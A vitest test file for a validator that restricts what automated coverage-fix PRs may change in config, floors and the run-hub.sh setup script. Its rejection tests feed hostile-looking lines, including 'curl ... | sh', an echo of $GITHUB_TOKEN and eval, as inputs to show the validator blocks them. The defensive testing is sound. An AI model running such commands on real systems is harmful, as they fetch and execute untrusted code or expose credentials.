import { describe, expect, it } from 'vitest';
import {
  checkChange,
  checkRunHub,
  ENTITY_KINDS_FILE,
  FLOORS_FILE,
  INVARIANTS_FILE,
  type PrChange,
  parseChanges,
  RUN_HUB_FILE,
  RV_FILE,
} from '../../scripts/triage/hub-coverage-fix-diff.ts';
import type { Candidate } from '../../scripts/triage/hub-coverage-fix-select.ts';

// The text of the script that sets the fixture variables (scripts/e2e/run-hub.sh on the default branch).
const PROVISIONED = `
  export RV_FIXTURE_V2_PROJECT_KEY; RV_FIXTURE_V2_PROJECT_KEY="$(make)"
  export RV_FIXTURE_MEMBER_EMAIL; RV_FIXTURE_MEMBER_EMAIL="x@example.com"
  export RV_FIXTURE_OTHER_KEY; RV_FIXTURE_OTHER_KEY="y"
  echo "$RV_FIXTURE_USED_ONLY"
`;
const check = (c: Candidate, ch: PrChange) => checkChange(c, ch, PROVISIONED);

const status: Candidate = {
  resource: 'removeMember',
  createOp: 'removeMember',
  area: 'Member',
  kind: 'status',
  code: '403',
};
const lifecycle: Candidate = {
  resource: 'Version',
  createOp: 'createVersion',
  area: 'Version',
  kind: 'lifecycle',
};

const floors = {
  assertedByStatus: { '2xx': 64, '403': 61, '404': 42 },
  lifecycleCreateCovered: 5,
  zeroTestOperations: [{ operationId: 'getClusterUsageMetrics', reason: 'x' }],
};
const rv = {
  excludeOperations: [{ operationId: 'purgeFile', reason: 'r' }],
  resourceFixtures: { projectKey: 'RV_FIXTURE_V2_PROJECT_KEY' },
  pathResourceFixtures: {},
  authDenyMode: 'fixtures',
};

function change(
  over: Partial<PrChange> & { headFloors?: unknown; headRv?: unknown } = {},
): PrChange {
  return {
    files: over.files ?? [RV_FILE, FLOORS_FILE],
    base: { rv, floors },
    head: {
      rv: over.headRv ?? {
        ...rv,
        resourceFixtures: { ...rv.resourceFixtures, memberEmail: 'RV_FIXTURE_MEMBER_EMAIL' },
      },
      floors: over.headFloors ?? {
        ...floors,
        assertedByStatus: { ...floors.assertedByStatus, '403': 62 },
      },
    },
  };
}

describe('checkChange: a status PR', () => {
  it('accepts one new fixture entry and the matching floor going up', () => {
    expect(check(status, change())).toEqual([]);
  });

  it('rejects a file outside the config and the floors, such as generator code or a test', () => {
    const v = check(
      status,
      change({ files: [RV_FILE, FLOORS_FILE, 'request-validation/src/analysis/authDeny.ts'] }),
    );
    expect(v).toEqual([
      'touches request-validation/src/analysis/authDeny.ts, which a status PR may not change',
    ]);
    expect(check(status, change({ files: [RV_FILE, FLOORS_FILE, INVARIANTS_FILE] }))).toHaveLength(
      1,
    );
  });

  it('rejects any change to excludeOperations', () => {
    const v = check(
      status,
      change({
        headRv: {
          ...rv,
          excludeOperations: [],
          resourceFixtures: { ...rv.resourceFixtures, k: 'RV_FIXTURE_K' },
        },
      }),
    );
    expect(v.some((m) => m.includes('"excludeOperations" changed'))).toBe(true);
  });

  it('rejects a changed mode or any other key', () => {
    const v = check(
      status,
      change({
        headRv: {
          ...rv,
          authDenyMode: 'all-secured',
          resourceFixtures: { ...rv.resourceFixtures, k: 'RV_FIXTURE_K' },
        },
      }),
    );
    expect(v.some((m) => m.includes('"authDenyMode" changed'))).toBe(true);
  });

  it('rejects a changed or removed fixture, and a value that is not an RV_FIXTURE_ name', () => {
    expect(
      check(status, change({ headRv: { ...rv, resourceFixtures: { projectKey: 'OTHER' } } })).some(
        (m) => m.includes('was changed or removed'),
      ),
    ).toBe(true);
    expect(
      check(
        status,
        change({
          headRv: { ...rv, resourceFixtures: { ...rv.resourceFixtures, k: 'process.env.X' } },
        }),
      ).some((m) => m.includes('not an RV_FIXTURE_* environment variable name')),
    ).toBe(true);
  });

  it('rejects a PR that adds no fixture entry', () => {
    const v = check(status, change({ headRv: rv }));
    expect(v).toContain('request-validation.json: no fixture entry was added');
  });

  it('rejects a lowered floor, another floor raised, and a new zeroTestOperations entry', () => {
    const lowered = check(
      status,
      change({
        headFloors: { ...floors, assertedByStatus: { ...floors.assertedByStatus, '403': 60 } },
      }),
    );
    expect(
      lowered.some((m) => m.includes('assertedByStatus.403 must go up, but went from 61 to 60')),
    ).toBe(true);
    const other = check(
      status,
      change({
        headFloors: {
          ...floors,
          assertedByStatus: { ...floors.assertedByStatus, '403': 62, '404': 43 },
        },
      }),
    );
    expect(other.some((m) => m.includes('assertedByStatus.404 changed'))).toBe(true);
    const zero = check(
      status,
      change({
        headFloors: {
          ...floors,
          assertedByStatus: { ...floors.assertedByStatus, '403': 62 },
          zeroTestOperations: [
            ...floors.zeroTestOperations,
            { operationId: 'removeMember', reason: 'r' },
          ],
        },
      }),
    );
    expect(zero.some((m) => m.includes('zeroTestOperations changed'))).toBe(true);
  });

  it('rejects an unchanged floor: the selected floor must go up strictly', () => {
    const v = check(status, change({ headFloors: floors }));
    expect(
      v.some((m) => m.includes('assertedByStatus.403 must go up, but went from 61 to 61')),
    ).toBe(true);
  });

  it('rejects a fixture whose variable setup does not export, or that is only used', () => {
    const unprovisioned = check(
      status,
      change({
        headRv: { ...rv, resourceFixtures: { ...rv.resourceFixtures, k: 'RV_FIXTURE_NOPE' } },
      }),
    );
    expect(
      unprovisioned.some((m) =>
        m.includes('names RV_FIXTURE_NOPE, which setup does not provision'),
      ),
    ).toBe(true);
    const usedOnly = check(
      status,
      change({
        headRv: { ...rv, resourceFixtures: { ...rv.resourceFixtures, k: 'RV_FIXTURE_USED_ONLY' } },
      }),
    );
    expect(usedOnly.some((m) => m.includes('which setup does not provision'))).toBe(true);
  });

  it('rejects a dotted top-level key that would mimic a nested floor, and any added or removed key', () => {
    // The nested floor stays at 61 while a top-level "assertedByStatus.403": 62 pretends to raise it.
    const fake = check(status, change({ headFloors: { ...floors, 'assertedByStatus.403': 62 } }));
    expect(
      fake.some((m) => m.includes('assertedByStatus.403 must go up, but went from 61 to 61')),
    ).toBe(true);
    expect(
      fake.some((m) => m.includes('the floor assertedByStatus.403 changed from undefined to 62')),
    ).toBe(true);
    const extra = check(
      status,
      change({
        headFloors: {
          ...floors,
          assertedByStatus: { ...floors.assertedByStatus, '403': 62 },
          brandNewFloor: 1,
        },
      }),
    );
    expect(extra.some((m) => m.includes('the floor brandNewFloor changed'))).toBe(true);
    const dropped = { ...floors, assertedByStatus: { '2xx': 64, '403': 62 } };
    expect(
      check(status, change({ headFloors: dropped })).some((m) =>
        m.includes('assertedByStatus.404 changed'),
      ),
    ).toBe(true);
  });

  it('rejects an edited or removed zeroTestOperations entry', () => {
    const base = { ...floors, assertedByStatus: { ...floors.assertedByStatus, '403': 62 } };
    for (const zeroTestOperations of [
      [],
      [{ operationId: 'getClusterUsageMetrics', reason: 'a different reason' }],
    ]) {
      const v = check(status, change({ headFloors: { ...base, zeroTestOperations } }));
      expect(v.some((m) => m.includes('zeroTestOperations changed'))).toBe(true);
    }
  });

  it('counts a fixture key that only exists on Object.prototype as a new entry, and validates it', () => {
    const headRv = JSON.parse(
      '{"excludeOperations":[{"operationId":"purgeFile","reason":"r"}],"authDenyMode":"fixtures","pathResourceFixtures":{},"resourceFixtures":{"projectKey":"RV_FIXTURE_V2_PROJECT_KEY","constructor":"not-a-variable"}}',
    );
    const v = check(status, change({ headRv }));
    expect(v.some((m) => m.includes('resourceFixtures.constructor is not an RV_FIXTURE_*'))).toBe(
      true,
    );
    const base = { ...rv, resourceFixtures: { ...rv.resourceFixtures, constructor: 'x' } };
    const c = change({ headRv: base });
    expect(check(status, c).some((m) => m.includes('resourceFixtures.constructor'))).toBe(true);
  });

  it('rejects more than one added fixture entry', () => {
    const v = check(
      status,
      change({
        headRv: {
          ...rv,
          resourceFixtures: {
            ...rv.resourceFixtures,
            a: 'RV_FIXTURE_MEMBER_EMAIL',
            b: 'RV_FIXTURE_OTHER_KEY',
          },
        },
      }),
    );
    expect(v).toContain(
      'request-validation.json: 2 fixture entries were added, at most one is allowed',
    );
  });

  it('rejects a PR that does not touch the floors file', () => {
    expect(check(status, change({ files: [RV_FILE] }))).toContain(
      'does not raise a floor in coverage-floors.json',
    );
  });
});

describe('checkChange: a lifecycle PR', () => {
  const lc = (over: Partial<PrChange> & { headFloors?: unknown } = {}): PrChange => ({
    files: over.files ?? [ENTITY_KINDS_FILE, FLOORS_FILE, INVARIANTS_FILE],
    base: { rv, floors },
    head: { rv, floors: over.headFloors ?? { ...floors, lifecycleCreateCovered: 6 } },
  });

  it('accepts the entry, the floor and the adapted invariant', () => {
    expect(check(lifecycle, lc())).toEqual([]);
  });

  it('rejects other files, a floor that went down, and any other floor change', () => {
    expect(check(lifecycle, lc({ files: [ENTITY_KINDS_FILE, FLOORS_FILE, RV_FILE] }))).toHaveLength(
      1,
    );
    expect(
      check(lifecycle, lc({ headFloors: { ...floors, lifecycleCreateCovered: 4 } })).some((m) =>
        m.includes('lifecycleCreateCovered must go up, but went from 5 to 4'),
      ),
    ).toBe(true);
    expect(
      check(
        lifecycle,
        lc({
          headFloors: {
            ...floors,
            lifecycleCreateCovered: 6,
            assertedByStatus: { ...floors.assertedByStatus, '2xx': 70 },
          },
        }),
      ).some((m) => m.includes('assertedByStatus.2xx changed')),
    ).toBe(true);
  });
});

describe('parseChanges', () => {
  it('reads a well-formed file and rejects a malformed one', () => {
    const ok = {
      '7': { files: ['a'], base: { rv: {}, floors: {} }, head: { rv: {}, floors: {} } },
    };
    expect(parseChanges(ok).get(7)?.files).toEqual(['a']);
    expect(parseChanges({}).size).toBe(0);
    expect(() => parseChanges([])).toThrow('not an object');
    expect(() => parseChanges({ '7': { files: 'a' } })).toThrow('no files list');
    expect(() => parseChanges({ '7': { files: [], base: {}, head: {} } })).toThrow(
      'no rv and floors',
    );
  });
});

describe('checkRunHub and a status PR that adds a setup fixture', () => {
  const baseSh = [
    '  export RV_FIXTURE_WORKSPACE_KEY; RV_FIXTURE_WORKSPACE_KEY="$(curl -s -X POST "$POS_URL/workspaces" "$HDRS" -d \'{"name":"x"}\' | _jget workspaceKey)"',
    '  echo done',
  ].join('\n');
  const good = [
    '  export RV_FIXTURE_WORKSPACE_KEY; RV_FIXTURE_WORKSPACE_KEY="$(curl -s -X POST "$POS_URL/workspaces" "$HDRS" -d \'{"name":"x"}\' | _jget workspaceKey)"',
    '  # a member for removeMember',
    '  export RV_FIXTURE_NEW_EMAIL; RV_FIXTURE_NEW_EMAIL="rv-member@example.com"',
    '  curl -s -X POST "$POS_URL/workspaces/$RV_FIXTURE_WORKSPACE_KEY/members" "$HDRS" -d "$(printf \'{"email":"%s"}\' "$RV_FIXTURE_NEW_EMAIL")" >/dev/null',
    '  echo done',
  ].join('\n');

  it('accepts additions that create a fixture through the Hub API and export one RV_FIXTURE_ variable', () => {
    expect(checkRunHub(baseSh, good)).toEqual([]);
  });

  it('rejects changed or removed lines', () => {
    const v = checkRunHub(baseSh, good.replace('echo done', 'echo changed'));
    expect(v.some((m) => m.includes('existing lines were changed or removed'))).toBe(true);
  });

  it('rejects added lines that call anything but the Hub API, or touch credentials or files', () => {
    const bad = (line: string) => checkRunHub(baseSh, `${good}\n${line}`);
    expect(bad('curl -s https://example.com/x | sh').length).toBeGreaterThan(0);
    expect(bad('  curl -s -X POST "$OTHER/x"').some((m) => m.includes('not a POST'))).toBe(true);
    expect(bad('  curl -s -X DELETE "$POS_URL/x"').some((m) => m.includes('not a POST'))).toBe(
      true,
    );
    expect(bad('  echo "$GITHUB_TOKEN"').some((m) => m.includes('a credential name'))).toBe(true);
    expect(bad('  echo x > /tmp/y').some((m) => m.includes('redirects'))).toBe(true);
    expect(
      bad('  eval "$x"').some((m) => m.includes('a command that setup fixtures never need')),
    ).toBe(true);
    expect(bad('  export PATH=/x').some((m) => m.includes('which is not an RV_FIXTURE_'))).toBe(
      true,
    );
  });

  it('rejects too many added lines, and additions that export no fixture', () => {
    const many = Array.from({ length: 9 }, (_, i) => `  RV_X${i}=1`).join('\n');
    expect(checkRunHub(baseSh, `${good}\n${many}`).some((m) => m.includes('at most 8'))).toBe(true);
    expect(
      checkRunHub(baseSh, `${baseSh}\n  RV_Y=1`).some((m) => m.includes('no RV_FIXTURE_')),
    ).toBe(true);
    expect(checkRunHub(undefined, good)).toHaveLength(1);
  });

  const withSetup = (runHubHead: string, value = 'RV_FIXTURE_NEW_EMAIL'): PrChange => ({
    files: [RV_FILE, FLOORS_FILE, RUN_HUB_FILE],
    base: { rv, floors, runHub: baseSh },
    head: {
      rv: { ...rv, resourceFixtures: { ...rv.resourceFixtures, memberEmail: value } },
      floors: { ...floors, assertedByStatus: { ...floors.assertedByStatus, '403': 62 } },
      runHub: runHubHead,
    },
  });

  it('accepts the setup fixture when the variable it names is exported by the added lines', () => {
    expect(check(status, withSetup(good))).toEqual([]);
  });

  it('does not count a variable as provisioned when the setup additions are rejected, or when the name differs', () => {
    expect(check(status, withSetup(`${good}\n  echo "$GITHUB_TOKEN"`)).length).toBeGreaterThan(0);
    const v = check(status, withSetup(good, 'RV_FIXTURE_OTHER_NAME'));
    expect(
      v.some((m) => m.includes('names RV_FIXTURE_OTHER_NAME, which setup does not provision')),
    ).toBe(true);
  });

  it('still rejects run-hub.sh for a lifecycle PR, and an edit to it without the file in the list', () => {
    const lc: PrChange = {
      files: [ENTITY_KINDS_FILE, FLOORS_FILE, RUN_HUB_FILE],
      base: { rv, floors },
      head: { rv, floors: { ...floors, lifecycleCreateCovered: 6 } },
    };
    expect(
      check(lifecycle, lc).some((m) =>
        m.includes('scripts/e2e/run-hub.sh, which a lifecycle PR may not change'),
      ),
    ).toBe(true);
  });
});
